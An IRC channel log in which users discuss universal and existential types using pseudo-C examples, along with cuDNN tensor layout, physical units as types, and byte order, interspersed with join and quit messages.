[03:08:15] <flakland> https://thedebrief.org/breakthrough-plasma-thruster-will-cannibalize-zombie-satellites-for-fuel/
[03:08:16] <bayaz> Title: Breakthrough Plasma Thruster will Cannibalize Zombie Satellites for Fuel - The Debrief 
[03:09:09] *** Quits: LucaTM (~LucaTM@user/lucatm) (Quit: Textual IRC Client: www.textualapp.com)
[03:10:24] <flakland> i assume this uses vaacuum arc thruster
[03:10:41] *** Quits: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de) (Ping timeout: 256 seconds)
[03:13:09] *** Quits: arcatech (~arcatech@user/arcatech) (Quit: Bye.)
[03:13:30] *** Joins: AbleBacon (~AbleBacon@user/AbleBacon)
[03:13:44] *** Quits: ThePhilgrim2 (~ThePhilgr@151.41.8.149) (Ping timeout: 268 seconds)
[03:14:50] *** Joins: herjazz (~herjazz@p6758124-ipngn30801marunouchi.tokyo.ocn.ne.jp)
[03:14:53] *** Joins: ThePhilgrim2 (~ThePhilgr@151.41.8.149)
[03:15:05] *** Joins: arcatech (~arcatech@user/arcatech)
[03:16:23] <Guest4193> ski: well if you're gonna muddle the waters why use Haskell in the first place?
[03:16:25] <Guest4193> :)
[03:18:41] <Guest4193> well, after fighting with the compiler a bit, I could write `fn whatever() -> [impl Debug; 3] { [1, 2, 3] }`
[03:19:38] *** Quits: wedr (~wedr@pool-108-20-128-8.bstnma.fios.verizon.net) (Remote host closed the connection)
[03:20:06] <Guest4193> but I keep getting `impl Trait` not allowed outside of function and method return types
[03:20:54] *** Quits: emf (~emf@2620:10d:c090:400::5:ba1c) (Quit: emf)
[03:22:12] *** Joins: jdmark (~jdmark@097-102-095-007.res.spectrum.com)
[03:23:27] *** Quits: newpy (~newpy@2601:280:4381:1390:806d:fb60:7313:ba74) (Quit: Leaving)
[03:24:35] *** Quits: engest (~engest@50.39.177.170) (Read error: Connection reset by peer)
[03:24:43] *** Quits: Burgundy (~yomon@86.127.194.72) (Remote host closed the connection)
[03:25:03] *** Joins: engest (~engest@50.39.177.170)
[03:25:44] *** Joins: richbridger (~richbridg@089144202237.atnat0011.highway.a1.net)
[03:25:50] <ski> Guest4193 : heh .. well, imho, the actual syntax used does muddle the waters more
[03:26:19] <ski> (and i'm not familiar enough with Rust syntax .. i could use pseudo-C, if you prefer ?)
[03:27:34] <Guest4193> yes please
[03:27:57] *** Quits: spaceangel (~spaceange@ip-89-176-181-220.net.upcbroadband.cz) (Remote host closed the connection)
[03:32:14] *** Quits: trebko (~trebko@137.220.86.97) (Ping timeout: 268 seconds)
[03:33:31] <Samian> Does this chart make sense to anyone? https://imgur.com/a/7KtJpcL (https://docs.nvidia.com/deeplearning/cudnn/api/index.html#cudnnSetSeqDataDescriptor)
[03:34:02] <Samian> It says VECT_DIM is the inner most dimension. That makes sense.
[03:34:10] <Samian> Time is second to inner most. That makes sense.
[03:34:41] *** Quits: palasso (~palasso@user/palasso) (Remote host closed the connection)
[03:34:42] <Samian> But it says BATCH_DIM is next dimension . I don't think that's right
[03:34:48] <Samian> BEAM looks like the next dimension
[03:35:15] <ski> well, the first might be something like `struct queue { typename T; T *state; void (*enqueue)(int,T *); int (*dequeue)(T *); }' .. the last, i suppose, `struct foo { typename T; map_t<char,T> *symtable; int (*cmp)(const T *,const T *); size_t (*weight)(T *); void (*render)(T *); }'
[03:35:15] *** Quits: Belxjander (~Belxjande@p1575007-ipoe.ipoe.ocn.ne.jp) (Quit: AmigaOS PPC 4.1 +E +U1 // AmIRC 68K)
[03:35:22] <ski> Guest4193 ^
[03:35:38] *** Quits: Klinda (~superleag@user/klinda) (Quit: Konversation terminated!)
[03:35:41] <Samian> I can't tell if contiguous storage is following the arrow trail, or the traditional left to right, next row and repeat.
[03:36:19] *** Joins: Belxjander (~Belxjande@p1575007-ipoe.ipoe.ocn.ne.jp)
[03:36:24] <flakland> samian i might be able to tell you if they published docs on how they implement CUDA so nouveaux had support for it, but alas the hardware i purchased is missing the manual i guess
[03:37:25] *** Joins: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de)
[03:40:17] <Guest4193> ski: no need for indicating exists T/forall T ?
[03:40:46] *** Quits: independent56 (~independe@85.255.232.182) (Ping timeout: 256 seconds)
[03:41:01] <ski> Samian : presumably it's the arrow trail ?
[03:41:17] <ski> Guest4193 : the `typename' field here has the same effect as `exists'
[03:41:51] *** Quits: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de) (Ping timeout: 256 seconds)
[03:42:10] <ski> (a dependent record is basically an existential quantification)
[03:42:46] <Guest4193> as in there is at least one T with a set of methods and a map_t that satisfies this requirements?
[03:42:58] *** Quits: mrig (~mrig@user/mrig) (Quit: WeeChat 3.0)
[03:43:28] *** Joins: CatCow (~wtf_over@c-73-96-109-206.hsd1.or.comcast.net)
[03:43:41] *** [_] is now known as [itchyjunk]
[03:43:51] *** Quits: Noisytoot (~noisytoot@sourcehut/user/noisytoot) (Ping timeout: 245 seconds)
[03:43:56] <ski> if you want to express it in that way, sure
[03:43:57] *** Quits: lemonsnicks (~lemonsnic@cpc159519-perr18-2-0-cust114.19-1.cable.virginm.net) (Ping timeout: 268 seconds)
[03:43:58] *** Joins: gggpkm (~gggpkm@114.245.104.132)
[03:44:07] *** Quits: Thedarkb (~Thedarkb@cpc84151-pool16-2-0-cust89.15-1.cable.virginm.net) (Ping timeout: 256 seconds)
[03:44:15] <Guest4193> and I guess forall would be written using generics? like strut foo<T> ...?
[03:44:21] *** Joins: Thedarkb (~Thedarkb@cpc84151-pool16-2-0-cust89.15-1.cable.virginm.net)
[03:44:39] *** Quits: Foritus (~buggery@cpc91316-watf11-2-0-cust68.15-2.cable.virginm.net) (Ping timeout: 268 seconds)
[03:44:43] <ski> (the `typename T;' field would have zero run-time cost, of course)
[03:45:03] *** Quits: federico_it (~textual@151.95.125.195) (Quit: Textual IRC Client: www.textualapp.com)
[03:45:06] <ski> Guest4193 : no, that would be a parameterized `struct' definition
[03:45:09] *** Joins: lemonsnicks (~lemonsnic@cpc159519-perr18-2-0-cust114.19-1.cable.virginm.net)
[03:45:45] *** Quits: gggpkm (~gggpkm@114.245.104.132) (Remote host closed the connection)
[03:45:52] <ski> but sure, `void frob<T>(foo<T> *x);' could be `forall', universal quantification
[03:46:14] <Samian> thanks ski!
[03:46:59] *** Quits: arcatech (~arcatech@user/arcatech) (Quit: Bye.)
[03:47:06] <ski> (also with zero run-time overhead. C++ templates, where you can actually (at compile-time) do a case distinction on the parameter, selecting different implementations, is something else (more powerful (in the cavalier sense, but less powerful in the predictive sense)))
[03:47:54] <ski> the idea here would be to merely have a sane, type-safe, compile-time typing wrapper, over the common, universal and existential, idioms that people already do all the time, with `void *'s
[03:48:06] <Samian> I'm tired of equivocations in the language of programmers.  For example someone set "vec_dim" to the length of a specific dimension.  Usually dimension specifies how many dimensions there are!
[03:48:39] <d3x0r> that's 'dimensions' :)
[03:48:43] *** Joins: Foritus (~buggery@cpc91316-watf11-2-0-cust68.15-2.cable.virginm.net)
[03:50:22] <Guest4193> sounds like something GPT might write
[03:50:59] <Guest4193> ski: I'm not following the universal and existential void* idiom part ...
[03:51:31] <[itchyjunk]> https://www.isomorphiclabs.com/blog
[03:51:31] <bayaz> Title: Isomorphic Labs | Blog 
[03:51:38] <Guest4193> an example please? (it's the 4th time I ask :))
[03:52:02] *** Quits: Lord_of_Life (~Lord@user/lord-of-life/x-2819915) (Ping timeout: 260 seconds)
[03:53:25] *** Joins: Lord_of_Life (~Lord@user/lord-of-life/x-2819915)
[03:56:34] *** Quits: pulse (~pulse@user/pulse) (Ping timeout: 256 seconds)
[03:56:35] *** Quits: Mangy_Dog (Mange@user/mangy-dog/x-7397214) (Ping timeout: 256 seconds)
[03:56:52] *** Quits: TonyStone (~TonyStone@2603-7080-8607-c36a-9cdb-69bc-753b-1e50.res6.spectrum.com) (Remote host closed the connection)
[03:57:36] <ski> Guest4193 : you've ever seen `void frob(void *context,int (*callback)(void *context,int blah));' ?
[03:57:41] *** Joins: Noisytoot (~noisytoot@sourcehut/user/noisytoot)
[03:58:10] <ski> where `context' is some private info that `callback' knows how to interpret, but which isn't anyone else's (including other callbacks) business
[03:59:56] <ski> sometimes you'd pack the context and the callback (possibly multiple ones, sharing the same context) in a `struct', like `struct { void *context; int (*callback)(void *context,int blah); }' .. this is basically an existential, would correspond to `struct { typename T; T *context; int (*callback)(T *context,int blah);}' in previous notation
[04:01:09] <ski> (and then you'd just have say `void frob(struct my_closure clos);' if `struct my_closure' is that `struct' .. you can do a kind of OOP, this way (closures, including OOP objects, are related to existential quantification))
[04:02:07] <ski> or, one could instead make `frob' (parametrically) polymorphic (iow, using universal quantification), like `void frob<T>(T *context,int (*callback)(T *context,int blah));'
[04:02:35] *** Quits: pretty_dumm_guy (trottel@gateway/vpn/protonvpn/prettydummguy/x-88029655) (Quit: WeeChat 3.3)
[04:03:29] <ski> either way, now the compiler would help you ensuring that you only pass this context, of type `T *', to the callback (unless you do casts, obviously .. but the idea is to reduce the amount of (legitimate) casting, so that possible problems, and possible bugs, more easily stand out from the forest of all casts, it being a smaller forest)
[04:04:47] *** Joins: zaher_ (~zaher@37.48.180.190)
[04:05:32] *** Joins: zaher__ (~zaher@46.58.212.57)
[04:06:00] *** Quits: password (~password@user/password2) (Remote host closed the connection)
[04:06:18] <ski> other (library) examples are e.g. `void *bsearch(const void *key,const void *base,size_t nmemb,size_t size,int (*compar)(const void *,const void *));', which could be `T *bsearch<T>(const T *key,const T *base,size_t nmemb,typesize_t<T> size,int (*compar)(const T *,const T *));'
[04:07:46] <ski> and `void qsort(void *base,size_t nmemb,size_t size,int (*compar)(const void *,const void *));', which could be `T qsort<T>(T *base,size_t nmemb,typesize_t<T> size,int (*compar)(const T *,const T *));'
[04:07:54] *** Quits: zaher (~zaher@37.48.190.214) (Ping timeout: 256 seconds)
[04:08:34] <ski> (although the callbacks here (`compar') really ought to take an additional, `context', argument (passed first to the function itself), of type `U *' say)
[04:09:33] <ski> (oh and `typesize_t<T>' is a type whose only legal value is the size of an object of type `T'. can be converted to `size_t', if need be ..)
[04:09:37] *** Quits: zaher_ (~zaher@37.48.180.190) (Ping timeout: 256 seconds)
[04:09:49] <Guest4193> alright so one uses void* to get a universal struct type but that's not type safe since you can just cast anything to void* and screw the whole type up
[04:10:19] *** Joins: WilliamLeara (~wdl@cpe-76-185-2-28.tx.res.rr.com)
[04:11:00] <d3x0r> welcome to weak type systems :)
[04:11:40] <d3x0r> you can pass anything to any function and mess it all up - you could pass an inteteger as the function pointer... 
[04:11:52] *** Quits: analoq (~yashi@user/dies) (Ping timeout: 256 seconds)
[04:12:00] *** Joins: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de)
[04:12:06] <ski> in logical terms (using pseudo-Haskell syntax), the function type `(exists x. Foo x) -> Bar' (expressing a function that takes a `Foo x' input, for *some* existing (unknown/opaque/abstract/hidden/forgotten/skolem) type `x'), producing a `Bar' output) is equivalent to `forall x. (Foo x -> Bar)' (the type of polymorphic functions, accepting a `Foo x' as input, for *any* `x', giving back a `Bar')
[04:13:20] *** Joins: analoq (~yashi@user/dies)
[04:14:06] <ski> (so, you can already express the behaviour of using existential quantification, in *argument* types, by plain (parametric) polymorphism (i.e. universal quantification) .. but when you *return* something of existential type, or you use it inside e.g. a `struct', then *this* is new, can't be expressed already in a different way)
[04:15:06] <ski> Guest4193 : any clearer, now ?
[04:16:38] *** Quits: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de) (Ping timeout: 268 seconds)
[04:16:59] <ski> (oh, and perhaps it wasn't evident, but the `bsearch' and `qsort' examples are from `stdlib.h', in C)
[04:18:28] *** Joins: merijn (~merijn@83-160-49-249.ip.xs4all.nl)
[04:18:40] *** Quits: bud (~bud@user/bud) (Ping timeout: 256 seconds)
[04:19:53] *** Quits: quartz (~quartz@user/quartz) (Quit: WeeChat 3.3)
[04:21:12] <Guest4193> "but when you *return* something of existential type, or you use it inside e.g. a `struct', then *this* is new, can't be expressed already in a different way)" I don't quite understand this part, like when search returns a T* ?
[04:21:53] <Guest4193> the `(exists x. Foo x) -> Bar === forall x. (Foo x -> Bar)` was mind boggling
[04:22:24] *** Joins: yin846 (~yin@2001:5b0:2a59:26e8:2c2f:90c:241e:3066)
[04:22:53] <ski> "like when search returns a T* ?" -- yes
[04:23:25] *** Parts: onion (~z@user/zero) ()
[04:23:46] <Guest4193> yes but why are we sure it can't expressed in a different way
[04:23:47] *** Quits: TJ- (~root@user/tj-) (Ping timeout: 264 seconds)
[04:24:21] <ski> well, let's consider a hypothetical `arrlen' function, that looks for the first `NULL' in an array of pointers (passed to the function via a pointer to the first pointer in the array)
[04:24:25] *** Joins: TJ- (~root@user/tj-)
[04:24:27] <ski> this could be
[04:25:26] <ski> (well, say it's an array of `void *' pointers .. and we point to the first pointer also by a `void *')
[04:25:42] <ski>   size_t arrlen(void *arr);
[04:25:53] *** Quits: ThePhilgrim2 (~ThePhilgr@151.41.8.149) (Ping timeout: 268 seconds)
[04:25:54] <ski> using universal quantification, it'd be something like
[04:26:15] <Guest4193> size_t arrlen<t>(T *arr); ?
[04:26:41] *** Joins: ttree (~ttree0@c-73-239-62-159.hsd1.wa.comcast.net)
[04:26:47] <ski>   size_t arrlen<T>(T **arr);  /* or, which is the same thing : size_t arrlen<T>(T *arr[]); */
[04:27:00] <ski> (this time, properly using `T 
[04:27:01] *** stoned is now known as Hash
[04:27:14] <Guest4193> yes no sneaky casts
[04:27:14] <ski> (this time, properly using `T **' to point to the first object of the array, which is a pointer of type `T *')
[04:27:42] <ski> (for some reason, people don't really like using `void **', hence i refrained from doing so in the first version)
[04:27:44] *** Quits: cthulchu (~Cthulchu@193.194.107.250) (Ping timeout: 256 seconds)
[04:27:45] *** Quits: cthulchu_ (~Cthulchu@193.194.107.250) (Ping timeout: 256 seconds)
[04:27:59] <ski> now, one could express the same functionality, using instead
[04:28:04] <Guest4193> is there any good reason for that?
[04:28:24] <ski>   size_t arrlen(struct { typename T; T **arr } somearr);
[04:28:46] <Guest4193> I recall that using void** allowed me to avoid doing casts in some cases
[04:29:06] <ski> in the former case, we can call `arrlen' for all types `T', passing a pointer to pointer to `T' as input, and getting a `size_t' back as result
[04:29:44] <ski> in the latter case, calling `arrlen' results in a `size_t', as long as there exists some type `T' such that we're passing a pointer to pointer to `T' (inside the `struct')
[04:29:59] <ski> note the "for all" in the first case, and the "there exists" in the second case
[04:30:18] <ski> nevertheless, these two express exactly the same possible functionality
[04:31:26] *** Joins: leduyquang753 (~leduyquan@user/leduyquang753)
[04:31:42] <ski> (which is what `forall x. (Foo x -> Bar)' being logically equivalent to `(exists x. Foo x) -> Bar' expresses, in a more symbolic fashion)
[04:31:43] <Guest4193> I see it now much better, but what exactly goes wrong if we say, return a pointer to the last element instead?
[04:32:23] <ski> that pointer type wouldn't match the expected return type, `size_t', and so you'd have a type error
[04:32:39] *** Quits: gitgood (~gitgood@80-44-12-204.dynamic.dsl.as9105.com) (Ping timeout: 268 seconds)
[04:32:56] *** Joins: pulse (~pulse@user/pulse)
[04:33:00] *** Quits: kish` (~aqua@user/aqua) (Ping timeout: 276 seconds)
[04:33:25] *** Joins: kish` (~aqua@user/aqua)
[04:33:46] <ski> (i suppose one could have syntax like `size_t arrlen<typename T>(T **arr);', which would make the two variants here of more comparable verbosity ..)
[04:33:57] *** Joins: mestre (~mestre@191.177.175.57)
[04:34:46] *** Quits: Hash (~stoned@is.coding.when.stoned.io) (Quit: WeeChat 3.3)
[04:36:28] <Guest4193> I mean no you said earlier that something like: `T *last_element<T>(T **arr); can't be written in terms of the first two, is that because the compiler has to enforce that the return type is actually of type T?
[04:37:21] <ski> oh
[04:38:40] <ski> yea, you can only rewrite/reformulate/refactor the type `forall x. (..x.. -> ...)' into `(exists x. ..x..) -> ...', in case `x' doesn't occur (free) in the return type `...' (otherwise you'd have an out-of-scope type variable, in the rewritten function type)
[04:39:28] <Guest4193> (exists x. Foo x) -> Bar x === forall x. (Foo x -> Bar x)` <- the LHS doesn't make any sense but the RHS does
[04:39:46] *** Joins: stoned (~stoned@is.coding.when.stoned.io)
[04:39:49] <ski> so, only when your polymorphic function doesn't mention the type variable (in question), that it is polymorphic over, in the return type .. only then can you refactor into passing an existential record/`struct' as argument
[04:39:57] <ski> Guest4193 : exactly
[04:40:52] <ski> there is a similar logical equivalence, that `Foo -> (forall x. Bar x)' is equivalent to `forall x. (Foo -> Bar x)', that's also sometimes useful, when you're refactoring your types
[04:42:13] <ski> this could be construed to say (similarly as what i said before about having an argument of existential type) that *returning* a polymorphic result doesn't add any extra (expressive/cavalier) power over just having plain polymorphic functions ..
[04:42:29] *** Joins: sonny (~sonny@bras-base-london1483w-grc-30-74-12-157-200.dsl.bell.ca)
[04:42:32] <ski> .. otoh, being able to take a polymorphic *argument* would add extra power
[04:44:44] <ski> (compare to how being able to return an existential/abstract *result* similarly add extra power. `forall' and `exists' are dual, "opposite" in a sense. they flip the rôle of caller/user/consumer vs. the rôle of callee/definer/implementor/producer .. for polymorphism/`forall', the *caller* picks the type, and the callee has to be prepared to handle any type. while for "abstraction"/`exists', the 
[04:44:46] <Guest4193> these universal/existential types seem to be very interesting, do they exist in "mainstream" languages like Java/JS/C++ ?
[04:44:50] <ski> *callee*/producer picks the type, and the caller/user/consumer has to be prepared to handle any type)
[04:45:03] *** Joins: TonyStone (~TonyStone@2603-7080-8607-c36a-9cdb-69bc-753b-1e50.res6.spectrum.com)
[04:45:37] *** Quits: Guest4285 (~sam@86.228.71.37.rev.sfr.net) (Ping timeout: 268 seconds)
[04:46:06] *** Joins: DevAntoine (~DevAntoin@2a01:e34:ec4e:a200:d0fd:3cfa:5fd6:6824)
[04:46:30] *** Quits: alefir (~alefir@rrcs-24-43-248-58.west.biz.rr.com) (Quit: alefir)
[04:46:41] <ski> Java and C++ does support parametric polymorphism, yea (although, both lack the "parametricity" property, that a polymorphic function *cannot* inspect a "polymorphic input", except via a callback that does it on behalf of it .. this "parametricity" property can really help with narrowing down what a random polymorphic library routine is allowed to do, make reasoning about, and refactoring, code easier)
[04:46:55] *** Joins: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de)
[04:47:13] *** Joins: mjs2600 (~mjs2600@c-24-91-3-49.hsd1.vt.comcast.net)
[04:47:24] <ski> ECMAscript isn't statically typed. iirc, "typed skins" of it, like Typescript and Purescript, do tend to have (parameterized data types and) (parametric) polymorphism
[04:48:27] <ski> existentials are less common. Haskell and Mercury has them. and Rust (albeit not fully, unless something's changed recently). possibly OCaml has them as well (?)
[04:49:19] <Guest4193> ski: doesn't the caller pick the type indirectly when they specify `typename` in the struct?
[04:50:36] *** Quits: Twipply (~Twipply@user/twipply) (Quit: Leaving)
[04:50:54] <ski> oh, right. OCaml does have GADTs (as an extension), and that implies existentials. (also, it has first-class modules, with which you can also encode existentials, using private types inside a module)
[04:51:10] *** Quits: DevAntoine (~DevAntoin@2a01:e34:ec4e:a200:d0fd:3cfa:5fd6:6824) (Ping timeout: 268 seconds)
[04:51:33] *** Quits: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de) (Ping timeout: 256 seconds)
[04:51:33] <ski> Guest4193 : the caller of what ?
[04:52:22] <Guest4193> you said "while for the "abstraction"/`exists', the callee*/producer picks the type, and the caller/user/consumer has to be prepared to handle any type)"
[04:52:30] <ski> the producer/implementor/callee of the `struct' will pick the type `T', yes, and put a pointer of type `T **' into the same `struct'
[04:52:41] *** Quits: merijn (~merijn@83-160-49-249.ip.xs4all.nl) (Ping timeout: 256 seconds)
[04:53:32] *** Quits: sonny (~sonny@bras-base-london1483w-grc-30-74-12-157-200.dsl.bell.ca) (Remote host closed the connection)
[04:54:09] *** Quits: bomb (~bomb@user/bomb) (Quit: ‏‏‎ ‎)
[04:54:17] <Guest4193> oh I thought you meant the called function by "callee"
[04:54:18] <ski> so, whoever produces the `struct' picks the type. and whoever consumes the `struct' has to be prepared to handle any type `T' (in the parametricity case, there is simply no way at all to do run-time reflection, so you can't discover the type of `T'. you can only pass pointers to `T' on to callbacks that you know accept them, because you know it's the same unknown/opaque/forgotten/hidden type `T')
[04:56:08] <ski> (well, perhaps i should say that it is possible, e.g. via a callback, to provide a way for the user/caller to discover the type of `T' (to lesser or greater extent) .. but that's always opt-in, must be explicitly declared in the interface. so with a plain existential, there is no way .. assuming you have "parametricity", which e.g. Java (and Mercury) doesn't have, since they allow you to use run-time 
[04:56:14] <ski> reflection to discover the type)
[04:56:27] <d3x0r> like the format string passed to printf
[04:56:34] <d3x0r> "%type %type ..."
[04:56:53] <ski> Guest4193 : yea, "caller" vs. "callee" makes sense mostly for functions. i was using the terms in a generalized sense, as in consumer/user vs. producer/implementor
[04:57:27] <d3x0r> uhm... users aer producers :) and consumers imlement
[04:58:08] <ski> in `double foo(int);', `foo' is the consumer of the `int', and the producer of the `double'
[04:58:21] <ski> whoever is calling `foo' is the producer of the `int', and the consumer of the `double'
[04:58:32] <d3x0r> and the user calling it produces the int in the first place and consumes the double
[04:58:55] <ski> (often "consuming" is done by just forwarding to someone else, e.g. passing to another call, or returning, or storing in some space for later retrieval)
[04:59:02] <d3x0r> p/c is terrible paradigm :)
[04:59:21] <[itchyjunk]> pcp
[05:00:34] <ski> (anyway, i used multiple alternative terms, in the hope that at least some of them would be clearer, make the point go home)
[05:00:46] <d3x0r> ya
[05:01:08] *** Joins: dodocrypto (~dodocrypt@user/dodocrypto)
[05:01:25] <ski> Guest4193 : oh, and the (first two) papers i mentioned before, does mention existentials as well, iirc
[05:01:44] <Guest4193> "On Understanding Types,
[05:01:45] <Guest4193> Data Abstraction, and Polymorphism"
[05:01:46] <Guest4193> ?
[05:02:10] <ski> yes, and the "Revisited" one
[05:02:30] <ski> (also, on a quick glance, it doesn't seem to talk that much about existentials)
[05:02:44] *** Quits: Psybur (~Psybur@mobile-166-170-30-165.mycingular.net) (Remote host closed the connection)
[05:03:08] <ski> another good source is the book "Types and Programming Languages" by Benjamin C. Pierce in 2002-02-01 at <https://www.cis.upenn.edu/~bcpierce/tapl/>
[05:03:27] *** Quits: peteyboy1 (~peteyboy1@95.169.232.161) (Ping timeout: 256 seconds)
[05:04:02] <d3x0r> I've come to realize types are a lot like units on values in say physics... a value and unit(type) is a complete thing and the only way to change units is to do a transformation function on it
[05:04:06] <ski> it talks a bit about two quite distinct ways in which one can use existentials, one of which yields OOP objects (a kind of closures), the other yields ADTs (Abstract Data Types)
[05:04:24] <d3x0r> JS is nice that you can check your own units; though C has some hacks for checking types as they're working towards generics
[05:04:41] *** Joins: qaph (~weechat@user/qaph)
[05:04:47] <ski> (it also talks about a lot of other stuff, including subtyping / inclusion polymorphism, &c.)
[05:05:08] *** Quits: trevors_ (~trevors@c-65-96-171-157.hsd1.ma.comcast.net) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[05:06:22] <d3x0r> why aren't units more part of math than science?
[05:06:51] <ski> well .. i'd rather say physical dimensions (like time, length/distance, mass, ..) are like types. units (like second, metre, foot, ..) are associated with a type / dimension
[05:07:06] <leduyquang753> Math rarely deals with units.
[05:07:20] *** Quits: kron (~weechat@user/qaph) (Ping timeout: 260 seconds)
[05:07:21] *** qaph is now known as kron
[05:07:40] <d3x0r> dimensions in that case have and are units
[05:07:45] <Guest4193> these days I''m trying to write a crappy version of OCaml where the compiler can deduce if your function is pure or not, so you won't be able to mix the two together
[05:07:51] <d3x0r> pressue volume temp as valid as time spin or length
[05:08:12] <Guest4193> and won't be able to declare an impure function as pure
[05:08:57] <PlanckWalk> There will always be cases where a function is pure but the compiler can't prove that, but that's okay.
[05:09:22] <ski> <https://en.wikipedia.org/wiki/Dimensional_analysis> is basically a kind of type-checking
[05:09:47] <d3x0r> 'In engineering and science,' the first 4 words - so again why not in math? :)
[05:09:51] *** Joins: sonny (~sonny@bras-base-london1483w-grc-30-74-12-157-200.dsl.bell.ca)
[05:10:05] <PlanckWalk> The mathematical structure of units is pretty dull
[05:10:14] <Guest4193> PlanckWalk: `impure { // I know what I'm doing }` :)
[05:11:10] * ski . o O ( "Fractional power of units of measures in F#" <https://stackoverflow.com/questions/11333135/fractional-power-of-units-of-measures-in-f> ; "Semi--vector spaces and units of measurement" by Josef Janyška,Marco Modugno,Raffaele Vitolo in 2007-10-05 at <https://arxiv.org/abs/0710.1313v1> )
[05:12:19] <ski> leduyquang753 : keeping the distinction between points (elements of an affine space) and vectors (elements of a vector space), can be useful. points are absolute (like absolute temperature), vectors are relative (like temperature difference)
[05:13:10] <ski> d3x0r : you can specify, or describe, an amount, or a measurement, in different units, but they could still correspond to the same amount, with the same physical dimension
[05:14:37] <ski> sometimes, in programming, it can make sense to keep different units separate .. but often, once you've converted from a real number, via a unit, to a physical quantity, you don't really care about which unit it was specified it, and often want to be able to combine amounts (of the same physical dimension), regarless of whether they were initially specified with the same units or not
[05:14:46] <d3x0r> I see what you're saying, but... that's not really it.  celcius != meters and having tempurature-feet is pretty meaningless - same dimensions, same values;
[05:15:14] <ski> (internally, often one'd convert to the same unit for the storage .. but sometimes rounding errors may be a reason not to mix units)
[05:16:25] *** Quits: BrianG61UK (~BrianG61U@2a02:8010:66b7:dddd:90ba:8af0:98ae:6d14) (Read error: Connection reset by peer)
[05:16:29] <ski> `tempurature-feet' makes no sense to me. `temperatureA - temperatureB' where `temperatureA = -40 celsius' and `temperatureB = -40 fahrenheit' does make sense, to me
[05:16:44] <d3x0r> well there's unit conversion and then unit convertion...   sure farenheight and celcius are more like accessors of a more generic temperature.... but then that isn't pressure and you don't have .pascals() on tempurtature
[05:17:00] <ski> (but yes, obviously you can't add or subtract quantities of different physical dimensions ..)
[05:17:12] * ski nods
[05:17:30] <d3x0r> c/f is more like byte/short/int
[05:17:50] *** Quits: jsmooth (~quassel@user/jsmooth) (Quit: jsmooth)
[05:18:13] <ski> so a physical dimension could have multiple units, which all would be reasonable to use, to construct a value/amount/quantity (in itself, conceptually, thought of as of no single particular unit) of the physical dimension
[05:18:46] <ski> d3x0r : well, more like octal vs. decimal vs. binary vs. hexadecimal notation, for expressing the same number, i'd say
[05:18:52] *** Joins: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de)
[05:19:28] <d3x0r> but like JS - multiple units ft-ln/s-s is a composite type distinct from a type with units m  or m/s
[05:19:29] <ski> (since `byte',`short',`int' tend to correspond to different ranges of integers, as opposed to the same way, but expressing those integers in a different way)
[05:19:40] <d3x0r> (or lenght vs horsepower)
[05:20:11] <ski> mhm, i see
[05:20:11] <d3x0r> ya... it's not an exact correlation; other than they're all 'integer' vs 'real'
[05:21:06] <ski> (i still think, often, it's useful to be allowed to mix and match units, as long as they belong to the same physical dimension. but there can be reasons/circumstances where one doesn't want to allow this)
[05:22:04] <d3x0r> sure... units of the same set/dimension/category but not units of any set
[05:22:06] <ski> if you want to, you could think of a base of a vector space as a "unit" of sorts. given a tuple of scalars, it converts that tuple into a vector in the space in question
[05:22:42] <ski> and a vector space (usually) has multiple bases ("multiple coordinate systems", if you will)
[05:22:51] * ski nods
[05:23:16] *** Quits: resamvi (~resamvi@p4ff773f9.dip0.t-ipconnect.de) (Ping timeout: 256 seconds)
[05:23:17] *** Quits: Quietwalker (~X@cpe-70-113-121-167.austin.res.rr.com) (Ping timeout: 256 seconds)
[05:23:24] <d3x0r> well that's called a metric
[05:24:43] <d3x0r> or metrics... ways of laying out the relation of units of digits (err meaning how many 1's) and their unit of measure (m,ft,kpc)
[05:26:39] *** Joins: mindraj (~crispr@user/mindraj)
[05:27:29] *** Joins: genrand (~textual@cpe-74-138-138-71.kya.res.rr.com)
[05:27:43] <ski> a metric gives you a way to compare distances (is this longer than that ? yes, it's twice as long). for a vector space, you'd need an inner product for that
[05:28:10] *** Quits: vysn (~vysn@user/vysn) (Ping timeout: 268 seconds)
[05:29:17] <d3x0r> well ceclius/farenheight are different metrics of temperature...
[05:29:44] <d3x0r> I guess I'm disregarding that a unit is both specifying the metrics and dimensional-axii of a thing... 
[05:30:16] <d3x0r> and considering only the dimensional specifications as 'types' that need conversions - the changes of metrics are just projections
[05:30:30] *** Joins: BrianG61UK (~BrianG61U@2a02:8010:66b7:dddd:cd85:64ac:7bb4:96e6)
[05:30:47] <d3x0r> if you follow the fule that char* of an int* will always point at the low byte; a big endian compiler would have to adjust the value of a pointer when converting from one to the other
[05:31:08] <d3x0r> but that's just metrics...
[05:31:32] <d3x0r> all units of length measure or time measure are really all I've been considering as 'unit'
[05:31:52] <d3x0r> (like the groups)
[05:32:01] <flakland> is little endian even faster than BE? who cursed us with this
[05:33:01] <sonny> why would it be faster?
[05:33:07] <sonny> just byte order
[05:34:35] * ski . o O ( given two two-element sets, there's two bijections between them .. and none of them is better than the other one )
[05:35:50] <sonny> flakland: just a choice you have to make when building a computer
[05:36:14] <flakland> you ever work with file formats?
[05:36:25] <sonny> no
[05:36:43] <sonny> only plaintext 
[05:37:11] <sonny> and json I guess
[05:37:54] *** Joins: moose (~moose@user/moose)
[05:37:56] <sonny> problem with configuration file formats, if you make a better one, no one is going to use it
[05:38:35] *** Quits: Rounin (~david@84.212.130.215) (Ping timeout: 256 seconds)
[05:38:41] <sonny> it's a fun project though, much easier than making a network protocol
[05:38:48] <d3x0r> ski m c d ()... k M G ... some of the unit part is generic
[05:38:58] <sonny> s/configuration/serialization/
[05:39:40] *** Joins: Cashlin (~hp@user/cashlin)
[05:42:08] *** Quits: leduyquang753 (~leduyquan@user/leduyquang753) (Quit: Lost terminal)
[05:42:55] *** Joins: MrBungle (~MrBungle@2604:3d08:1788:dc00:81e:1483:4212:54c1)
[05:44:43] *** Joins: ozarker (~ozarker@172-15-173-110.lightspeed.mssnks.sbcglobal.net)
